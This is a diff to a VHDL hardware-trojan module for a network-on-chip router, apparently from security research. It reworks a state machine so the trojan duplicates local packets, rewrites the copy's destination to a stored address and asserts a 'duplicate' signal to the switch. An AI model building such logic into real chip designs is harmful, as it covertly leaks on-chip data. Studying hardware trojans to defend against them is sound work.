@@ -17,7 +17,8 @@ entity HardwareTrojan is
         
         data_in :	 	in regflit; 	-- to read the information on the local port
         destAddr :      in regmetadeflit;
-        dupHeader :     out regflit;
+        dupFlit :       out regflit;
+        sending:        in std_logic;
 
         --Switch Control Interface
         duplicate : 	out std_logic; 	-- to inform the SW that the packet must be duplicated
@@ -34,7 +35,6 @@ entity HardwareTrojan is
         dataSel	:		out std_logic; 	-- to select which flit will go through the crossbar
 
         --Local Buffer Interface
-      	fakeCredit :	out std_logic;
         maskPkg_o :     out std_logic;
         h :             in std_logic;
         h_ack :         in std_logic
@@ -43,7 +43,7 @@ end HardwareTrojan;
 
 architecture HardwareTrojan of HardwareTrojan is
 
-type HTState is (S0, waiting, readDestination, waitPkg);
+type HTState is (S0, waiting, readDestination, waitHeader, transmitting);
 signal state : HTState;
 signal destination : regmetadeflit;
 
@@ -73,12 +73,22 @@ begin
                 -- Stores the Destination address to replace it in the duplicated packet
                 when readDestination =>
                     destination <= destAddr;
-                    state <= waitPkg;
+                    state <= waitHeader;
 
                 -- Waits until the LOCAL IP send a new packet
-                when waitPkg =>
+                when waitHeader =>
+                    if sending = '1' then -- ADICIONAR O CREDITO AQUI! PARA GARANTIR A LEITURA
+                        state <= transmitting;
+                    else
+                        state <= waitHeader;
+                    end if;
 
-                    state <= waitPkg;
+                when transmitting =>
+                    if sending = '1' then
+                        state <= transmitting;
+                    else
+                        state <= waitHeader;
+                    end if;
 
                 when OTHERS =>
                     state <= S0;
@@ -87,13 +97,10 @@ begin
     end process;
 
     -- Duplicated packet header
-    dupHeader <= x"00" & destination;
-
-    -- Controle de fluxo combinado de ambos os pacotes
-    fakeCredit <= '1';
+    dupFlit <= x"01" & destination when state = waitHeader else data_in;
 
     -- Informa o Switch Control que ele deve rotear os próximos pacotes locais para duas saídas
-    duplicate <= '1' when state = waitPkg else '0';
+    duplicate <= '1' when state = waitHeader else '0';
 
     data_out <= (others=> '0');
     dataSel <= '0';
